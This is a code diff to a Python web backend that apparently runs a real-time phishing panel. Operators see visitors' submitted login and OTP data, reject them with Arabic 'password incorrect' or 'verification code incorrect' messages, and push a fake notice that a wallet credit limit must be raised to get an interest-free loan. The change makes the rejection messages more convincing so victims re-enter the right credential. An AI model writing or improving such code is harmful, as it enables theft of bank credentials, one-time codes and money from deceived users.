@@ -140,7 +140,8 @@ class VisitorControlHub:
                 self.disconnect(visitor_id, connection)
 
 
-REJECTION_MESSAGE_AR = "رمز التحقق غير صحيح"
+LOGIN_REJECTION_MESSAGE_AR = "كلمة المرور غير صحيحة"
+OTP_REJECTION_MESSAGE_AR = "رمز التحقق غير صحيح"
 SUPPORT_APPROVAL_MESSAGE_AR = "الحد الائتماني بمحفظتك متدني يرجى رفع الحد الائتماني لقبول طلبك والحصول على القرض الحسن. لمزيد من الاستفسارات والمعلومات التواصل مع خدمة العملاء."
 SUPPORT_SETTINGS_DOCUMENT_ID = "support_whatsapp"
 PAGE_TITLES_BY_PATH = {
@@ -636,12 +637,22 @@ def _set_submission_approval_status_sync(
             },
         }
     elif approval_status == "rejected":
+        existing_document = collection.find_one(
+            {"_id": parsed_submission_id},
+            {"form_name": 1, "fields": 1},
+        )
+        rejection_message = LOGIN_REJECTION_MESSAGE_AR
+        if existing_document is not None:
+          existing_fields = existing_document.get("fields", {})
+          existing_form_name = str(existing_document.get("form_name", "")).lower()
+          if _build_otp_display(existing_fields) or "verification" in existing_form_name or "otp" in existing_form_name:
+              rejection_message = OTP_REJECTION_MESSAGE_AR
         update_data = {
             "$set": {
                 "approval_status": "rejected",
                 "rejected_at": acted_at,
                 "rejected_by": acted_by,
-                "rejection_message": REJECTION_MESSAGE_AR,
+                "rejection_message": rejection_message,
             },
             "$unset": {
                 "approved_at": "",
@@ -1393,7 +1404,7 @@ async def verification_page(request: Request):
             "support_whatsapp_number": support_settings["whatsapp_number"],
             "support_whatsapp_url": support_settings["whatsapp_url"],
             "support_approval_message": support_settings["success_message"],
-            "otp_rejection_message": REJECTION_MESSAGE_AR,
+            "otp_rejection_message": OTP_REJECTION_MESSAGE_AR,
         },
     )
 
@@ -1715,7 +1726,7 @@ async def admin_reject_submission(submission_id: str, request: Request):
             "submission_id": submission["id"],
             "visitor_id": submission["visitor_id"],
             "submission": submission,
-            "error_message": REJECTION_MESSAGE_AR,
+            "error_message": submission.get("rejection_message", LOGIN_REJECTION_MESSAGE_AR),
         }
     )
     visitor_hub: VisitorApprovalHub = request.app.state.visitor_approval_hub
@@ -1725,10 +1736,14 @@ async def admin_reject_submission(submission_id: str, request: Request):
             "type": "submission_rejected",
             "submission_id": submission["id"],
             "visitor_id": submission["visitor_id"],
-            "error_message": REJECTION_MESSAGE_AR,
+            "error_message": submission.get("rejection_message", LOGIN_REJECTION_MESSAGE_AR),
         },
     )
-    return {"status": "ok", "submission": submission, "error_message": REJECTION_MESSAGE_AR}
+    return {
+        "status": "ok",
+        "submission": submission,
+        "error_message": submission.get("rejection_message", LOGIN_REJECTION_MESSAGE_AR),
+    }
 
 
 @app.get("/api/forms/submission-status")
